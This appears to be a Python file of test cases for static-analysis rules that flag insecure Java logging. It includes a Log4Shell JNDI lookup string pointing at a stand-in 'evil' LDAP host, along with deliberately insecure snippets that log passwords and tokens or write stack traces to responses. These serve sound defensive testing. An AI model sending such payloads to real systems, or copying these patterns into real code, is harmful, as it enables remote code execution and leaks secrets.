"""Cases for the logging pack: Logging.

CASES rows are (rule id, path, text, line numbers the rule must report); an empty list is a
correct change the rule must stay silent on. FLOW_CASES rows are (label, path, text, rule ids
`evaluate` must report over every rule, rule ids this case is evidence about): a case whose
expected set leaves out a rule it is about proves that rule stays silent there.
"""

from __future__ import annotations

LOG4J_LOOKUPS = "logging-log4j-lookups"
SENSITIVE_DATA = "logging-sensitive-data"
STACKTRACE_TO_RESPONSE = "logging-stacktrace-to-response"
INJECTION = "logging-injection"

CONCAT = (
    "public class C {\n"
    '  @GetMapping("/x")\n'
    "  public void x(@RequestParam String name) {\n"
    '    log.info("name=" + name);\n'
    "  }\n}\n"
)
PLACEHOLDER = (
    "public class C {\n"
    '  @GetMapping("/x")\n'
    "  public void x(@RequestParam String name) {\n"
    '    log.info("name={}", name);\n'
    "  }\n}\n"
)

#: (rule id, path, text, lines)
CASES: list[tuple[str, str, str, list[int]]] = [
    # logging-log4j-lookups
    (LOG4J_LOOKUPS, "log4j2.properties", "log4j2.formatMsgNoLookups=false\n", [1]),
    (LOG4J_LOOKUPS, "log4j2.xml", '<PatternLayout pattern="%d %m{lookups}%n"/>\n', [1]),
    (LOG4J_LOOKUPS, "log4j2.xml", '<PatternLayout pattern="%d %msg{lookups}%n"/>\n', [1]),
    (LOG4J_LOOKUPS, "C.java", 'String payload = "${jndi:ldap://evil/a}";\n', [1]),
    (LOG4J_LOOKUPS, "log4j2.xml", '<PatternLayout pattern="%d %m%n"/>\n', []),
    (LOG4J_LOOKUPS, "log4j2.properties", "log4j2.formatMsgNoLookups=true\n", []),
    # logging-sensitive-data
    (SENSITIVE_DATA, "C.java", 'log.info("login attempt for user {} with password {}", user, password);\n', [1]),
    (SENSITIVE_DATA, "C.java", 'log.debug("token=" + token);\n', [1]),
    (SENSITIVE_DATA, "C.java", 'log.warn("bad login for {}", request.getApiKey());\n', [1]),
    (SENSITIVE_DATA, "C.java", 'log.info("password reset requested for {}", userId);\n', []),
    (SENSITIVE_DATA, "C.java", 'log.info("login for {}", mask(password));\n', []),
    (SENSITIVE_DATA, "C.java", 'log.info("login for {}", user.getId());\n', []),
    (SENSITIVE_DATA, "C.java", 'log.debug("token type {}", tokenType);\n', []),
    (SENSITIVE_DATA, "C.java", 'log.warn("login failed: {}", passwordPolicy.describe());\n', []),
    (SENSITIVE_DATA, "C.java", 'log.info("refreshed tokens: {}", tokenCount);\n', []),
    (SENSITIVE_DATA, "C.java", 'log.info("Password changed for user {}", user.getId());\n', []),
    # logging-stacktrace-to-response
    (STACKTRACE_TO_RESPONSE, "C.java", "e.printStackTrace(response.getWriter());\n", [1]),
    (STACKTRACE_TO_RESPONSE, "C.java", "response.getWriter().write(e.getMessage());\n", [1]),
    (STACKTRACE_TO_RESPONSE, "C.java", "response.getWriter().print(ExceptionUtils.getStackTrace(e));\n", [1]),
    (
        STACKTRACE_TO_RESPONSE,
        "C.java",
        "return ResponseEntity.status(500).body(ExceptionUtils.getStackTrace(e));\n",
        [1],
    ),
    (STACKTRACE_TO_RESPONSE, "C.java", 'log.error("failed", e);\n', []),
    (
        STACKTRACE_TO_RESPONSE,
        "C.java",
        'return ResponseEntity.status(500).body("Internal error, ref " + correlationId);\n',
        [],
    ),
]

#: (label, path, text, expected rule ids, rule ids this case is about)
FLOW_CASES: list[tuple[str, str, str, set[str], set[str]]] = [
    ("request data concatenated into a log line", "C.java", CONCAT, {INJECTION}, {INJECTION}),
    ("the same value passed as a placeholder argument", "C.java", PLACEHOLDER, set(), {INJECTION}),
]
